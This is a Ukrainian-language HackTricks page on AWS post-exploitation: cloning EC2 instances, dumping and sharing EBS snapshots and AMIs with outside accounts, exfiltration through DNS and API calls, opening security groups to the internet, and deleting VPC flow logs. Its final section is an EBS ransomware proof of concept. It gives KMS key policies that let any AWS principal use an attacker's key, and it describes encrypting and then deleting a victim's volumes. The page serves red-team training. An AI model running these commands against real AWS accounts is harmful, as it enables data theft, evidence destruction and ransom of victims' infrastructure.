# AWS - –ü—ñ—Å–ª—è–µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—è EC2, EBS, SSM —Ç–∞ VPC

<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤.

</details>

## EC2 —Ç–∞ VPC

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **–ó–ª–æ–≤–º–∏—Å–Ω–µ –¥–∑–µ—Ä–∫–∞–ª–æ VPC -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

–î–∑–µ—Ä–∫–∞–ª—é–≤–∞–Ω–Ω—è —Ç—Ä–∞—Ñ—ñ–∫—É VPC **–¥—É–±–ª—é—î –≤—Ö—ñ–¥–Ω–∏–π —Ç–∞ –≤–∏—Ö—ñ–¥–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –¥–ª—è –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ EC2 –≤ –º–µ–∂–∞—Ö VPC** –±–µ–∑ –Ω–µ–æ–±—Ö—ñ–¥–Ω–æ—Å—Ç—ñ –≤—Å—Ç–∞–Ω–æ–≤–ª—é–≤–∞—Ç–∏ —â–æ-–Ω–µ–±—É–¥—å –Ω–∞ —Å–∞–º—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏. –¶–µ–π –¥—É–±–ª—å–æ–≤–∞–Ω–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –∑–∞–∑–≤–∏—á–∞–π –Ω–∞–¥—Å–∏–ª–∞—î—Ç—å—Å—è –Ω–∞ —â–æ—Å—å –Ω–∞ –∫—à—Ç–∞–ª—Ç —Å–∏—Å—Ç–µ–º–∏ –≤–∏—è–≤–ª–µ–Ω–Ω—è –≤—Ç–æ—Ä–≥–Ω–µ–Ω—å –≤ –º–µ—Ä–µ–∂—É (IDS) –¥–ª—è –∞–Ω–∞–ª—ñ–∑—É —Ç–∞ –º–æ–Ω—ñ—Ç–æ—Ä–∏–Ω–≥—É.\
–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —Ü–µ –¥–ª—è –∑–∞—Ö–æ–ø–ª–µ–Ω–Ω—è –≤—Å—å–æ–≥–æ —Ç—Ä–∞—Ñ—ñ–∫—É —Ç–∞ –æ—Ç—Ä–∏–º–∞–Ω–Ω—è —á—É—Ç–ª–∏–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –∑ –Ω—å–æ–≥–æ:

–î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü—é —Å—Ç–æ—Ä—ñ–Ω–∫—É:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### –ö–æ–ø—ñ—é–≤–∞–Ω–Ω—è –∑–∞–ø—É—â–µ–Ω–æ–≥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞

–ï–∫–∑–µ–º–ø–ª—è—Ä–∏ –∑–∞–∑–≤–∏—á–∞–π –º—ñ—Å—Ç—è—Ç—å —è–∫—É—Å—å —á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é. –Ñ —Ä—ñ–∑–Ω—ñ —Å–ø–æ—Å–æ–±–∏ –ø–æ—Ç—Ä–∞–ø–∏—Ç–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—É (–ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [—Ö–∏—Ç—Ä–æ—â—ñ –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ EC2](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)). –û–¥–Ω–∞–∫ —ñ–Ω—à–∏–π —Å–ø–æ—Å—ñ–± –ø–µ—Ä–µ–≤—ñ—Ä–∏—Ç–∏, —â–æ –≤–æ–Ω–∏ –º—ñ—Å—Ç—è—Ç—å, - **—Å—Ç–≤–æ—Ä–∏—Ç–∏ AMI —Ç–∞ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –Ω–æ–≤–∏–π –µ–∫–∑–µ–º–ø–ª—è—Ä (–Ω–∞–≤—ñ—Ç—å —É –≤–ª–∞—Å–Ω–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ) –∑ –Ω—å–æ–≥–æ**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### –ó–Ω—ñ–º–æ–∫ EBS

**–ó–Ω—ñ–º–∫–∏ - —Ü–µ —Ä–µ–∑–µ—Ä–≤–Ω—ñ –∫–æ–ø—ñ—ó —Ç–æ–º—ñ–≤**, —è–∫—ñ –∑–∞–∑–≤–∏—á–∞–π –º—ñ—Å—Ç—è—Ç—å **—á—É—Ç–ª–∏–≤—É —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é**, —Ç–æ–º—É –ø–µ—Ä–µ–≤—ñ—Ä–∫–∞ —ó—Ö –ø–æ–≤–∏–Ω–Ω–∞ —Ä–æ–∑–∫—Ä–∏—Ç–∏ —Ü—é —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é.\
–Ø–∫—â–æ –≤–∏ –∑–Ω–∞–π–¥–µ—Ç–µ **—Ç–æ–º –±–µ–∑ –∑–Ω—ñ–º–∫–∞**, –≤–∏ –º–æ–∂–µ—Ç–µ: **—Å—Ç–≤–æ—Ä–∏—Ç–∏ –∑–Ω—ñ–º–æ–∫** —ñ –≤–∏–∫–æ–Ω–∞—Ç–∏ –Ω–∞—Å—Ç—É–ø–Ω—ñ –¥—ñ—ó –∞–±–æ –ø—Ä–æ—Å—Ç–æ **–ø—ñ–¥–∫–ª—é—á–∏—Ç–∏ –π–æ–≥–æ –¥–æ –µ–∫–∑–µ–º–ø–ª—è—Ä–∞** –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É:

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### –ï–∫—Å—Ç—Ä–∞–∫—Ü—ñ—è –¥–∞–Ω–∏—Ö

#### –ï–∫—Å—Ç—Ä–∞–∫—Ü—ñ—è —á–µ—Ä–µ–∑ DNS

–ù–∞–≤—ñ—Ç—å —è–∫—â–æ –≤–∏ –∑–∞–±–ª–æ–∫—É—î—Ç–µ EC2, —â–æ–± –Ω—ñ—è–∫–∏–π —Ç—Ä–∞—Ñ—ñ–∫ –Ω–µ –º—ñ–≥ –≤–∏—Ö–æ–¥–∏—Ç–∏, –≤—ñ–Ω –≤—Å–µ –æ–¥–Ω–æ –º–æ–∂–µ **–µ–∫—Å—Ç—Ä–∞–≥—É–≤–∞—Ç–∏—Å—è —á–µ—Ä–µ–∑ DNS**.

* **–ñ—É—Ä–Ω–∞–ª–∏ –ø–æ—Ç–æ–∫—ñ–≤ VPC —Ü—å–æ–≥–æ –Ω–µ –∑–∞—Ñ—ñ–∫—Å—É—é—Ç—å**.
* –£ –≤–∞—Å –Ω–µ–º–∞—î –¥–æ—Å—Ç—É–ø—É –¥–æ –∂—É—Ä–Ω–∞–ª—ñ–≤ DNS AWS.
*   –í–∏–º–∫–Ω—ñ—Ç—å —Ü–µ, –≤—Å—Ç–∞–Ω–æ–≤–∏–≤—à–∏ "enableDnsSupport" –≤ –∑–Ω–∞—á–µ–Ω–Ω—è false –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### –ï–∫—Å—Ç—Ä–∞–∫—Ü—ñ—è —á–µ—Ä–µ–∑ –≤–∏–∫–ª–∏–∫–∏ API

–ê—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ —Ç–æ—á–∫–∏ API –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É, —è–∫–∏–º –≤—ñ–Ω –∫–µ—Ä—É—î. Cloudtrail –∑–∞—Ä–µ—î—Å—Ç—Ä—É—î —Ü—ñ –≤–∏–∫–ª–∏–∫–∏, —ñ –∞—Ç–∞–∫—É–≤–∞–ª—å–Ω–∏–∫ –∑–º–æ–∂–µ –ø–æ–±–∞—á–∏—Ç–∏ –µ–∫—Å—Ç—Ä–∞–≥–æ–≤–∞–Ω—ñ –¥–∞–Ω—ñ –≤ –∂—É—Ä–Ω–∞–ª–∞—Ö Cloudtrail.

### –í—ñ–¥–∫—Ä–∏—Ç–∞ –≥—Ä—É–ø–∞ –±–µ–∑–ø–µ–∫–∏

–í–∏ –º–æ–∂–µ—Ç–µ –æ—Ç—Ä–∏–º–∞—Ç–∏ –¥–æ–¥–∞—Ç–∫–æ–≤–∏–π –¥–æ—Å—Ç—É–ø –¥–æ –º–µ—Ä–µ–∂–µ–≤–∏—Ö —Å–ª—É–∂–±, –≤—ñ–¥–∫—Ä–∏–≤—à–∏ –ø–æ—Ä—Ç–∏ —Ç–∞–∫–∏–º —á–∏–Ω–æ–º:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### –ü—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–∏–≤—ñ–ª–µ—ó–≤ –¥–æ ECS

–ú–æ–∂–ª–∏–≤–æ –∑–∞–ø—É—Å—Ç–∏—Ç–∏ –µ–∫–∑–µ–º–ø–ª—è—Ä EC2 —Ç–∞ –∑–∞—Ä–µ—î—Å—Ç—Ä—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —É –∑–∞–ø—É—Å–∫—É –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ ECS, –∞ –ø–æ—Ç—ñ–º –≤–∫—Ä–∞—Å—Ç–∏ –¥–∞–Ω—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ ECS.

–î–ª—è [**–¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ —Ü–µ**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### –í–∏–¥–∞–ª–µ–Ω–Ω—è –∂—É—Ä–Ω–∞–ª—ñ–≤ –ø–æ—Ç–æ–∫—É VPC
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### –ü–æ–¥—ñ–ª–∏—Ç–∏—Å—è –∑–Ω—ñ–º–∫–æ–º EBS

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

–î–æ–∫–∞–∑ –≤—ñ–¥–ø–æ–≤—ñ–¥–Ω–æ –¥–æ –∫–æ–Ω—Ü–µ–ø—Ü—ñ—ó, —Å—Ö–æ–∂–æ—ó –Ω–∞ –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—é Ransomware, –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–æ–≤–∞–Ω—É –≤ –Ω–æ—Ç–∞—Ç–∫–∞—Ö –ø–æ –µ–∫—Å–ø–ª—É–∞—Ç–∞—Ü—ñ—ó –ø—ñ—Å–ª—è S3. KMS —Å–ª—ñ–¥ –ø–µ—Ä–µ–π–º–µ–Ω—É–≤–∞—Ç–∏ –Ω–∞ RMS –¥–ª—è —Å–ª—É–∂–±–∏ —É–ø—Ä–∞–≤–ª—ñ–Ω–Ω—è –≤–∏–º–∞–≥–∞–Ω–Ω—è–º–∏ –≤–∏–∫—É–ø—É, –æ—Å–∫—ñ–ª—å–∫–∏ –¥—É–∂–µ –ª–µ–≥–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –π–æ–≥–æ –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ä—ñ–∑–Ω–∏—Ö —Å–ª—É–∂–± AWS.

–°–ø–æ—á–∞—Ç–∫—É –∑ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS '–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞' —Å—Ç–≤–æ—Ä—ñ—Ç—å –∫–µ—Ä–æ–≤–∞–Ω–∏–π –∫–ª—ñ—î–Ω—Ç–æ–º –∫–ª—é—á –≤ KMS. –ù–∞ —Ü—å–æ–º—É –ø—Ä–∏–∫–ª–∞–¥—ñ –º–∏ –ø—Ä–æ—Å—Ç–æ –¥–æ–∑–≤–æ–ª–∏–º–æ AWS –∫–µ—Ä—É–≤–∞—Ç–∏ –¥–∞–Ω–∏–º–∏ –∫–ª—é—á–∞ –¥–ª—è –º–µ–Ω–µ, –∞–ª–µ –≤ —Ä–µ–∞–ª—ñ—Å—Ç–∏—á–Ω–æ–º—É —Å—Ü–µ–Ω–∞—Ä—ñ—ó –∑–ª–æ–≤–º–∏—Å–Ω–∏–π –∞–∫—Ç–æ—Ä –∑–±–µ—Ä—ñ–≥–∞—Ç–∏–º–µ –¥–∞–Ω—ñ –∫–ª—é—á–∞ –ø–æ–∑–∞ –∫–æ–Ω—Ç—Ä–æ–ª–µ–º AWS. –ó–º—ñ–Ω—ñ—Ç—å –ø–æ–ª—ñ—Ç–∏–∫—É –∫–ª—é—á–∞, —â–æ–± –¥–æ–∑–≤–æ–ª–∏—Ç–∏ –±—É–¥—å-—è–∫–æ–º—É –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—É AWS Principal –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∫–ª—é—á. –î–ª—è —Ü—ñ—î—ó –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞ —ñ–º'—è –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É –±—É–ª–æ 'AttackSim', –∞ –ø—Ä–∞–≤–∏–ª–æ –ø–æ–ª—ñ—Ç–∏–∫–∏, —â–æ –¥–æ–∑–≤–æ–ª—è—î –¥–æ—Å—Ç—É–ø, –Ω–∞–∑–∏–≤–∞—î—Ç—å—Å—è '–ó–æ–≤–Ω—ñ—à–Ω—î —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è'.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
–ü—Ä–∞–≤–∏–ª–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞ –ø–æ—Ç—Ä–µ–±—É—î –Ω–∞—Å—Ç—É–ø–Ω–æ–≥–æ —É–≤—ñ–º–∫–Ω–µ–Ω–Ω—è –¥–ª—è –º–æ–∂–ª–∏–≤–æ—Å—Ç—ñ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è –π–æ–≥–æ –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è —Ç–æ–º–∞ EBS:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

–¢–µ–ø–µ—Ä, –∫–æ–ª–∏ –∫–ª—é—á –¥–æ—Å—Ç—É–ø–Ω–∏–π –¥–ª—è –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è, –º–∏ –º–æ–∂–µ–º–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –æ–±–ª—ñ–∫–æ–≤–∏–π –∑–∞–ø–∏—Å "–∂–µ—Ä—Ç–≤–∏", —É —è–∫–æ–≥–æ –∑–∞–ø—É—â–µ–Ω–æ –¥–µ—è–∫—ñ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ EC2 –∑ –ø—Ä–∏—î–¥–Ω–∞–Ω–∏–º–∏ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–º–∏ —Ç–æ–º–∞–º–∏ EBS. –¶—ñ —Ç–æ–º–∏ EBS –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É "–∂–µ—Ä—Ç–≤–∏" - —Ü–µ —Ç–µ, –Ω–∞ —â–æ –º–∏ —Å–ø—Ä—è–º–æ–≤—É—î–º–æ —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è, —Ü–µ–π –∞—Ç–∞–∫–∞ –≤—ñ–¥–±—É–≤–∞—î—Ç—å—Å—è –ø—ñ–¥ —á–∞—Å –ø—Ä–∏–ø—É—â–µ–Ω–æ–≥–æ –ø–æ—Ä—É—à–µ–Ω–Ω—è –≤–∏—Å–æ–∫–æ–ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–æ–≥–æ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É AWS.

–ü–æ–¥—ñ–±–Ω–æ –¥–æ –ø—Ä–∏–∫–ª–∞–¥—É —Ä–æ–∑—à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è S3. –¶—è –∞—Ç–∞–∫–∞ —Å—Ç–≤–æ—Ä–∏—Ç—å –∫–æ–ø—ñ—ó –ø—Ä–∏—î–¥–Ω–∞–Ω–∏—Ö —Ç–æ–º—ñ–≤ EBS –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –∑–Ω—ñ–º–∫—ñ–≤, –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏–º–µ –ø—É–±–ª—ñ—á–Ω–æ –¥–æ—Å—Ç—É–ø–Ω–∏–π –∫–ª—é—á –∑ –æ–±–ª—ñ–∫–æ–≤–æ–≥–æ –∑–∞–ø–∏—Å—É "–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞" –¥–ª—è —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è –Ω–æ–≤–∏—Ö —Ç–æ–º—ñ–≤ EBS, –ø–æ—Ç—ñ–º –≤—ñ–¥'—î–¥–Ω–∞—î –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ —Ç–æ–º–∏ EBS –≤—ñ–¥ –µ–∫–∑–µ–º–ø–ª—è—Ä—ñ–≤ EC2 —Ç–∞ –≤–∏–¥–∞–ª–∏—Ç—å —ó—Ö, –∞ –ø–æ—Ç—ñ–º –≤–∏–¥–∞–ª–∏—Ç—å –∑–Ω—ñ–º–∫–∏, –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω—ñ –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è –Ω–æ–≤–∏—Ö –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—Ö —Ç–æ–º—ñ–≤ EBS.

–¶–µ –ø—Ä–∏–∑–≤–æ–¥–∏—Ç—å –¥–æ —Ç–æ–≥–æ, —â–æ –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ –∑–∞–ª–∏—à–∞—é—Ç—å—Å—è –ª–∏—à–µ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ç–æ–º–∏ EBS.

–¢–∞–∫–æ–∂ –≤–∞—Ä—Ç–æ –∑–∞–∑–Ω–∞—á–∏—Ç–∏, —â–æ —Å–∫—Ä–∏–ø—Ç –∑—É–ø–∏–Ω–∏–≤ –µ–∫–∑–µ–º–ø–ª—è—Ä–∏ EC2 –¥–ª—è –≤—ñ–¥'—î–¥–Ω–∞–Ω–Ω—è —Ç–∞ –≤–∏–¥–∞–ª–µ–Ω–Ω—è –æ—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω–∏—Ö —Ç–æ–º—ñ–≤ EBS. –û—Ä–∏–≥—ñ–Ω–∞–ª—å–Ω—ñ –Ω–µ–∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω—ñ —Ç–æ–º–∏ —Ç–µ–ø–µ—Ä –≤—ñ–¥—Å—É—Ç–Ω—ñ.

–î–∞–ª—ñ –ø–æ–≤–µ—Ä–Ω—ñ—Ç—å—Å—è –¥–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞ –≤ –æ–±–ª—ñ–∫–æ–≤–æ–º—É –∑–∞–ø–∏—Å—ñ "–∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∞" —Ç–∞ –≤–∏–¥–∞–ª—ñ—Ç—å –ø—Ä–∞–≤–∏–ª–æ –ø–æ–ª—ñ—Ç–∏–∫–∏ "–ó–æ–≤–Ω—ñ—à–Ω—î —à–∏—Ñ—Ä—É–≤–∞–Ω–Ω—è" –∑ –ø–æ–ª—ñ—Ç–∏–∫–∏ –∫–ª—é—á–∞.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
